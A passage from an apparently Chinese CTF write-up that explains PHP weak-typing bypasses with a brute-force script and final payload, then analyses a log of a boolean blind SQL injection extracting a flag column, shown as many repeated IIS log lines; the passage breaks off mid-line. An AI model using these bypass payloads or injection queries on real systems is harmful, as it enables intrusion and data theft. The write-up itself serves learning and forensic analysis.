class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json_decode会对json格式的字符串进行解码，解码后通过(array)转化为数组</p><p>数组中必须含有键名x21和x22，其中键名x21对应的键值不能是数字字符串且必须大于2017，根据PHP弱类型比较可以赋值”x21”=&gt;”2017a”</p><p>键名x22对应键值必须是一个数组，且数组元素个数要等于2且数组第一个元素也必须是一个数组，然后键值数组的每一个元素都不能等于”XIPU”，但是array_search函数搜索键值数组中是否含有”XIPU”必须返回true，这里需要利用到array_search函数的特点，也是弱类型比较，”XIPU”intval值为0，数组中任一元素为0即可返回true</p><p>所以payload:x2={“x21”:”2017a”,”x22”:[[1],0]}</p><p>第三个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$x3 = $_GET[&apos;x3&apos;];</span><br><span class="line">if ($x3 != &apos;15562&apos;) &#123;</span><br><span class="line">if (strstr($x3, &apos;XIPU&apos;)) &#123;</span><br><span class="line">if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</span><br><span class="line">$d=1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$x3弱类型比较不等于’15562’，且’XIPU’必须出现在$x3中，且$x3经过md5函数加密后的第八位到第十六位等于’15562’经过md5函数加密后的第八位到第十六位</p><p>这里想不出怎么绕过，我就直接写了个脚本破解，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/test/test34.php?x3="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000000</span>):</span><br><span class="line">    url = url + str(i) + <span class="string">'XIPU'</span></span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    print(r.text + <span class="string">' i: '</span> + str(i))</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/test/test34.php?x3="</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'yes'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>本地环境代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>];</span><br><span class="line"><span class="keyword">echo</span> substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span>(substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破结果为x3=47484XIPU</p><p>最终的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x1=1a&amp;x2=&#123;&quot;x21&quot;:&quot;2017a&quot;,&quot;x22&quot;:[[1],0]&#125;&amp;x3=47484XIPU</span><br></pre></td></tr></table></figure><h3 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h3><p>存在data.log文件</p><p>首先对文件进行url解码后搜索关键字flag，过滤出最后的盲注flag语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;53|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;49 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;99|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;100 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;102|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;101 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET 